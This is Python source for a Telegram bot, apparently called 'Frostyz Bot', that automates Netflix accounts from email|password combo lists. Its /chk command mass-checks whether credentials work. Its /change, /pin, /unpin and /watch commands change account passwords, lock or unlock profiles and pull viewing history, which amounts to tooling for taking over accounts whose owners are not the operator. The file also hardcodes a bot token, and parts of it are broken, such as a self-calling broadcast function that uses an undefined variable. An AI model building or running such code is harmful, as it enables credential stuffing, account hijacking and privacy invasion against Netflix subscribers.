import logging
import time
import site_scraper
import re  # Add this line
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram import ParseMode
from telegram.ext import (
    Updater,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackContext,
    CallbackQueryHandler,
)



import requests
import json
import nep
import database
import threading
from telegram.utils import helpers

from netflix_actions import Netflix
PROFILE_PIN= "4242"

PROFILE_TO_PIN= "swoyam"
IS_MASTER_PROFILE= True

INCORRECT_PASS_RES= "Incorrect password"
TECHNICAL_MSG="We are having technical difficulties"
WELCOME_MSG= "Welcome back"



logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)

# Administrator Telegram ID
ADMIN_TELEGRAM_ID = 1166528406

# Anti-spam cooldown in seconds
COOLDOWN_SECONDS = 10


def start(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    first_name = update.message.from_user.first_name

    update.message.reply_text(
        f"👋 *Hello, {first_name}!* I'm the Frostyz Bot made by @deadhacks7. 🤖\n"
        f"\n"
        f"Your user ID is: `{user_id}`\n"
        f"\n"
        f"Please click on /register to register yourself in the bot. 📝",
        parse_mode=ParseMode.MARKDOWN,
    )

def register(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    first_name = update.message.from_user.first_name

    if database.is_user_registered(user_id):
        update.message.reply_text("✅ You are already registered.")
        return

    database.register_user(user_id)
    update.message.reply_text(
        "✅ *Registration successful!* Now, you can use the /cmds command to see available options.",
        parse_mode=ParseMode.MARKDOWN,
    )

def cmds(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id

    if not database.is_user_registered(user_id):
        update.message.reply_text(
            "❌ You need to register first. Please use the /register command."
        )
        return

    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        context.bot.send_message(
            chat_id=ADMIN_TELEGRAM_ID,
            text=f"User {user_id} ({update.message.from_user.full_name}) is requesting access to the bot.",
        )
        return

    keyboard = [
        [
            InlineKeyboardButton("Admin Commands", callback_data="admin_commands"),
            InlineKeyboardButton("User Help", callback_data="user_help"),
        ],
        [
            InlineKeyboardButton("Tools", callback_data="tools"),
        ],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "🔧 *Available Commands:*",
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN,
    )
def user_help(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(
        "*Additional Commands:*\n"
        "1) *To check Netflix accounts in mass amount:* /chk\n"
        "   *(👀👀MAKE SURE YOU PUT ACCOUNTS NEXT LINE AFTER👀👀)* /chk\n"
        "2) *To change account password:* /change\n"
        "3) *To put a pin in any Netflix profile:* /pin\n"
        "4) *To remove a pin from any Netflix profile:* /unpin\n"
        "5) *To retrieve the watch history of any Netflix profile:* /watch",
        parse_mode=ParseMode.MARKDOWN,
    )


def process_url(update, user_id, url):
    try:
        result = site_scraper.get_site_details(url)
        update.message.reply_text(result,parse_mode=ParseMode.MARKDOWN)
        database.increment_user_stat(user_id)
    except Exception as e:
        logger.error(str(e))
        update.message.reply_text("❌ An error occurred while extracting site details. Please try again.")


def site_command(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 1:
        update.message.reply_text("❌ Please provide a URL after /site command.")
        return

    url = context.args[0]
    update.message.reply_text("🔍 *Processing your request, please wait...*", parse_mode=ParseMode.MARKDOWN)
    
    user_id = update.message.from_user.id
    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        return

    if database.is_user_in_cooldown(user_id) and user_id != ADMIN_TELEGRAM_ID:
        remaining_time = int(database.redis_client.ttl(f"{database.REDIS_DB_NAME}:cooldown:{user_id}"))
        update.message.reply_text(
            f"⏳ Please wait {remaining_time} seconds before submitting another URL."
        )
        return
    
    threading.Thread(target=process_url, args=(update, user_id, url)).start()
    if user_id != ADMIN_TELEGRAM_ID:
        database.set_user_cooldown(user_id, COOLDOWN_SECONDS)




def button_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()

    if query.data == "admin_commands":
        if update.effective_user.id == ADMIN_TELEGRAM_ID:
            query.message.reply_text("Admin Commands:\n\n"
                                      "/approve [user_id] - Approve a user\n"
                                      "/ban [user_id] - Ban a user\n"
                                      "/userstats [user_id] - Show user stats\n"
                                      "/broadcast [message] - Broadcast a message to all users")
        else:
            query.message.reply_text("❌ You don't have permission to use admin commands.")
    elif query.data == "user_help":
        user_help(query, context)
    elif query.data == "tools":
        query.message.reply_text(
    "Tools:\n\n"
    "1. /chk\n"
    "   *Usage:* /chk account_info\n"
    "2. /change\n"
    "   *Usage:* /change account_info new_password\n"
    "3. /pin\n"
    "   *Usage:* /pin account_info profile_name profile_pin\n"
    "4. /unpin\n"
    "   *Usage:* /unpin account_info profile_name\n"
    "5. /watch\n"
    "   *Usage:* /watch account_info profile_name"
,parse_mode=ParseMode.MARKDOWN)   

def main() -> None:
    updater = Updater(token="6124093744:AAFer0ObgFtc5Q2Q2sbFHPhPRbDXaQoV39E", use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("register", register))
    dispatcher.add_handler(CommandHandler("cmds", cmds))
    dispatcher.add_handler(CommandHandler("pin", put_pin))
    dispatcher.add_handler(CallbackQueryHandler(button_handler))
    dispatcher.add_handler(CommandHandler("approve", approve_user))
    dispatcher.add_handler(CommandHandler("site", site_command))
    dispatcher.add_handler(CommandHandler("ban", ban_user))
    dispatcher.add_handler(CommandHandler("chk", reply_user))
    dispatcher.add_handler(CommandHandler("userstats", user_stats))
    dispatcher.add_handler(CommandHandler("unpin", remove_pin))
    dispatcher.add_handler(CommandHandler("watch", watch_history))
    dispatcher.add_handler(CommandHandler("change", change_password))


    updater.start_polling()
    updater.idle()

def approve_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    user_id = int(context.args[0])
    database.set_user_approved(user_id, approved=True)
    update.message.reply_text(f"✅ User {user_id} has been approved.")
    context.bot.send_message(chat_id=user_id, text="🎉 Your access to the Site Details Extractor Bot has been approved. Type /cmds to see available options.")




def change_password(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("*Please Wait......*",parse_mode=ParseMode.MARKDOWN)
    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    user_id = update.message.from_user.id
    
    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        return

    if database.is_user_in_cooldown(user_id) and user_id != ADMIN_TELEGRAM_ID:
        remaining_time = int(database.redis_client.ttl(f"{database.REDIS_DB_NAME}:cooldown:{user_id}"))
        update.message.reply_text(
            f"⏳ Please wait {remaining_time} seconds before submitting another URL."
        )
        return

    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    

    # Extract account information from the message text
    message_text = update.message.text

    # Remove the "/change_password" part
    parts = message_text.split(' ')[1:]

    # Join the remaining parts back into a single string
    account_info = ' '.join(parts)

    # Extract email, old password, and new password
    email, password_info = account_info.split("|")
    old_password, new_password = password_info.strip().split()

    print(f"{email} {old_password} {new_password}")

    netflix= Netflix(n_Email=email, n_Password=old_password)
    driver_message= netflix.login()
            
    if WELCOME_MSG.lower() in netflix.check_alive_netflix().lower():
                update.message.reply_text(f"*Netflix: THE NETFLIX ACCOUNT {email} HAS DIED*", parse_mode=ParseMode.MARKDOWN)
    elif not INCORRECT_PASS_RES.lower() in driver_message.lower() and not TECHNICAL_MSG.lower() in driver_message.lower():
                netflix.redir_next_page()

                time.sleep(0.9)
                change_pass=netflix.change_password(old_pass=old_password,new_pass=new_password)
                netflix.close_driver()
                if change_pass.strip().lower()=="next, set up a password recovery number":
                    update.message.reply_text(f"*Netflix: {email} : {new_password} , CHANGED SUCCESFULLY✅*", parse_mode=ParseMode.MARKDOWN)
                
                else:
                    update.message.reply_text(f"*THERE IS SOME ERROR*", parse_mode=ParseMode.MARKDOWN)
    
    else:
                update.message.reply_text(f"*Netflix: {email} : {old_password} || Driver Message: {driver_message}*", parse_mode=ParseMode.MARKDOWN)
    
def put_pin(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("*Please Wait......*", parse_mode=ParseMode.MARKDOWN)

    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    user_id = update.message.from_user.id

    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        return

    if database.is_user_in_cooldown(user_id) and user_id != ADMIN_TELEGRAM_ID:
        remaining_time = int(database.redis_client.ttl(f"{database.REDIS_DB_NAME}:cooldown:{user_id}"))
        update.message.reply_text(
            f"⏳ Please wait {remaining_time} seconds before submitting another URL."
        )
        return

    # Extract account information from the message text
    message_text = update.message.text

    # Split the message text by ' ' to get individual parts
    parts = message_text.split(' ')[1:]

    # Check if there are at least three parts (account_info, profile_name, pin_to_put)
    if len(parts) < 3:
        update.message.reply_text(
            "❌ Incorrect usage. Please use the format: /pin account_info profile_name pin_to_put"
        )
        return

    # Extract account_info, profile_name, and pin_to_put
    account_info = parts[0]
    # Join the rest of the parts as the profile name, accounting for gaps
    profile_name = ' '.join(parts[1:-1])
    pin_to_put = parts[-1]

    email, password_info = account_info.split("|")
    netflix= Netflix(n_Email=email, n_Password=password_info)
    driver_message= netflix.login()
            
    if WELCOME_MSG.lower() in netflix.check_alive_netflix().lower():
                update.message.reply_text(f"*Netflix: THE NETFLIX ACCOUNT {email} HAS DIED*", parse_mode=ParseMode.MARKDOWN)
    elif not INCORRECT_PASS_RES.lower() in driver_message.lower() and not TECHNICAL_MSG.lower() in driver_message.lower():
                netflix.redir_next_page()

                time.sleep(0.9)
                returned_full_info, returned_all_profiles = netflix.extract_all_info()
                PROFILE_TO_PIN_FORMATTED= f"profile_{returned_all_profiles.index(profile_name.lower())}"
                change_pin=netflix.put_pin(profile_name=PROFILE_TO_PIN_FORMATTED,account_password=password_info,pin_code=pin_to_put)
                print(change_pin)
                if change_pin.strip().lower()=="profile lock saved.":
                    update.message.reply_text(f"*✅ Netflix account of {email} with profile name {profile_name} is locked wih pin {pin_to_put} ✅*", parse_mode=ParseMode.MARKDOWN)
                else:
                    update.message.reply_text(f"*THERE IS SOME ERROR*", parse_mode=ParseMode.MARKDOWN)
    else:
                update.message.reply_text(f"*Netflix: {email} : {password_info} || Driver Message: {driver_message}*", parse_mode=ParseMode.MARKDOWN)

def remove_pin(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("*Please Wait......*", parse_mode=ParseMode.MARKDOWN)

    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    user_id = update.message.from_user.id

    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        return

    if database.is_user_in_cooldown(user_id) and user_id != ADMIN_TELEGRAM_ID:
        remaining_time = int(database.redis_client.ttl(f"{database.REDIS_DB_NAME}:cooldown:{user_id}"))
        update.message.reply_text(
            f"⏳ Please wait {remaining_time} seconds before submitting another URL."
        )
        return

    # Extract account information and profile_name from the message text
    message_text = update.message.text

    # Split the message text by ' ' to get individual parts
    parts = message_text.split(' ')[1:]

    # Check if there are at least two parts (account_info, profile_name)
    if len(parts) < 2:
        update.message.reply_text(
            "❌ Incorrect usage. Please use the format: /unpin account_info profile_name"
        )
        return

    # Extract account_info and profile_name
    account_info = parts[0]
    # Join the rest of the parts as the profile name, accounting for spaces
    profile_name = ' '.join(parts[1:])

    email, password_info = account_info.split("|")
    netflix = Netflix(n_Email=email, n_Password=password_info)
    driver_message = netflix.login()

    if WELCOME_MSG.lower() in netflix.check_alive_netflix().lower():
        update.message.reply_text(f"*Netflix: THE NETFLIX ACCOUNT {email} HAS DIED*", parse_mode=ParseMode.MARKDOWN)
    elif not INCORRECT_PASS_RES.lower() in driver_message.lower() and not TECHNICAL_MSG.lower() in driver_message.lower():
        netflix.redir_next_page()

        time.sleep(0.9)
        returned_full_info, returned_all_profiles = netflix.extract_all_info()
        PROFILE_TO_PIN_FORMATTED = f"profile_{returned_all_profiles.index(profile_name.lower())}"
        remove_pin_result = netflix.remove_pin(rprofile_name=PROFILE_TO_PIN_FORMATTED, raccount_password=password_info,IS_MASTER=False)
        print(remove_pin_result)
        if remove_pin_result.strip().lower() == "profile lock saved.":
            update.message.reply_text(f"*✅ Netflix account of {email} with profile name {profile_name} has been removed pin ✅*",
                                      parse_mode=ParseMode.MARKDOWN)
        else:
            update.message.reply_text(f"*THERE IS SOME ERROR*", parse_mode=ParseMode.MARKDOWN)
    else:
        update.message.reply_text(f"*Netflix: {email} : {password_info} || Driver Message: {driver_message}*", parse_mode=ParseMode.MARKDOWN)



def watch_history(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("*Please Wait......*", parse_mode=ParseMode.MARKDOWN)

    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    user_id = update.message.from_user.id

    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        return

    if database.is_user_in_cooldown(user_id) and user_id != ADMIN_TELEGRAM_ID:
        remaining_time = int(database.redis_client.ttl(f"{database.REDIS_DB_NAME}:cooldown:{user_id}"))
        update.message.reply_text(
            f"⏳ Please wait {remaining_time} seconds before submitting another URL."
        )
        return

    # Extract account information and profile_name from the message text
    message_text = update.message.text

    # Split the message text by ' ' to get individual parts
    parts = message_text.split(' ')[1:]

    # Check if there are at least two parts (account_info, profile_name)
    if len(parts) < 2:
        update.message.reply_text(
            "❌ Incorrect usage. Please use the format: /unpin account_info profile_name"
        )
        return

    # Extract account_info and profile_name
    account_info = parts[0]
    # Join the rest of the parts as the profile name, accounting for spaces
    profile_name = ' '.join(parts[1:])

    email, password_info = account_info.split("|")
    netflix = Netflix(n_Email=email, n_Password=password_info)
    driver_message = netflix.login()

    if WELCOME_MSG.lower() in netflix.check_alive_netflix().lower():
        update.message.reply_text(f"*Netflix: THE NETFLIX ACCOUNT {email} HAS DIED*", parse_mode=ParseMode.MARKDOWN)
    elif not INCORRECT_PASS_RES.lower() in driver_message.lower() and not TECHNICAL_MSG.lower() in driver_message.lower():
        netflix.redir_next_page()

        time.sleep(0.9)
        returned_full_info, returned_all_profiles = netflix.extract_all_info()
        try:
            PROFILE_TO_PIN_FORMATTED= f"profile_{returned_all_profiles.index(profile_name.lower())}"
        except:
            print("Input Profile not found")
        all_date, all_title= netflix.retrive_latest_watch(sprofile_name=PROFILE_TO_PIN_FORMATTED)
        if not all_date==[1,5,6]:
            formatted_title_list=""
            number_of_watches= len(all_date)
            in_value=0
            while not number_of_watches==0:
                formatted_title_list+=f"Date: {all_date[in_value].text} || Title: {all_title[in_value].text}"+"\n"
                number_of_watches-=1
                in_value+=1

            print(formatted_title_list)
            update.message.reply_text(f"*Netflix: {email} : {password_info} || Watch History: {formatted_title_list}*", parse_mode=ParseMode.MARKDOWN)
        else:
            update.message.reply_text(f"*THERE IS SOME ERROR*", parse_mode=ParseMode.MARKDOWN)
    else:
        update.message.reply_text(f"*Netflix: {email} : {password_info} || Driver Message: {driver_message}*", parse_mode=ParseMode.MARKDOWN)

    # Use the extracted information as needed
    # ...
    # Your code to process account_info, profile_name, and pin_to_put goes here

    # Example usage (print the extracted values)


    # You can respond to the user based on the extracted val






def reply_user(update: Update, context: CallbackContext) -> None:
    update.message.reply_text(f"*Please Wait......*", parse_mode=ParseMode.MARKDOWN)
    user_id = update.message.from_user.id
    
    if not database.is_user_approved(user_id):
        update.message.reply_text(
            "❌ Your access to the Site Details Extractor Bot is pending approval. "
            "The administrator will review your request and grant you access shortly."
        )
        return

    if database.is_user_in_cooldown(user_id) and user_id != ADMIN_TELEGRAM_ID:
        remaining_time = int(database.redis_client.ttl(f"{database.REDIS_DB_NAME}:cooldown:{user_id}"))
        update.message.reply_text(
            f"⏳ Please wait {remaining_time} seconds before submitting another URL."
        )
        return

    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    # Extract account information from the message text
    message_text = update.message.text
    # Split by newlines to handle multiple accounts
    account_lines = message_text.split('\n')[1:]  # Skip the "/reply" part
    netflix_accounts = [line.strip() for line in account_lines if line.strip()]

    # Print the list of accounts
    print(netflix_accounts)
    for account in netflix_accounts:
        emaill, passwordd = account.strip().split("|")
        netflix= Netflix(n_Email=emaill, n_Password=passwordd)
        print(f"Email: {emaill} , Password: {passwordd}")
        driver_message= netflix.login()
            
        if WELCOME_MSG.lower() in netflix.check_alive_netflix().lower():
                update.message.reply_text(f"*❌Netflix: THE NETFLIX ACCOUNT {account} HAS DIED❌*", parse_mode=ParseMode.MARKDOWN)
        elif not INCORRECT_PASS_RES.lower() in driver_message.lower() and not TECHNICAL_MSG.lower() in driver_message.lower():
                netflix.redir_next_page()

                time.sleep(0.9)
                returned_full_info, returned_all_profiles = netflix.extract_all_info()
                update.message.reply_text(f"*✅Netflix: {account} || Full info: {returned_full_info} || Profiles {returned_all_profiles}✅*", parse_mode=ParseMode.MARKDOWN)
        else:
                update.message.reply_text(f"* ❌Netflix: {account} || Driver Message: {driver_message}❌*", parse_mode=ParseMode.MARKDOWN)

    update.message.reply_text("✅ Accounts processed and printed.")



def ban_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    user_id = int(context.args[0])
    database.set_user_approved(user_id, approved=False)
    update.message.reply_text(f"❌ User {user_id} has been banned.")
    context.bot.send_message(chat_id=user_id, text="⛔ Your access to the Site Details Extractor Bot has been revoked.")

def user_stats(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return
def broadcast_message(context: CallbackContext, message: str) -> None:
    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    if not context.args:
        update.message.reply_text("❌ Please provide a message to broadcast.")
        return

    message = ' '.join(context.args)
    broadcast_message(context, message)
    update.message.reply_text("✅ Broadcast message sent.")

    user_id = int(context.args[0])
    if not database.is_user_registered(user_id):
        update.message.reply_text("❌ User not registered.")
    else:
        requests_count = database.get_user_stat(user_id)
        approved_status = database.is_user_approved(user_id)
        update.message.reply_text(
            f"📊 User {user_id} stats:\n\n"
            f"Approved: {'Yes' if approved_status else 'No'}\n"
            f"Requests processed: {requests_count}"
        )


def broadcast(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_TELEGRAM_ID:
        update.message.reply_text("❌ You don't have permission to use this command.")
        return

    message = update.message.text.split(None, 1)[1]
    broadcast_message(context, message)
    update.message.reply_text("✅ Broadcast message sent.")


if __name__ == '__main__':
    main()
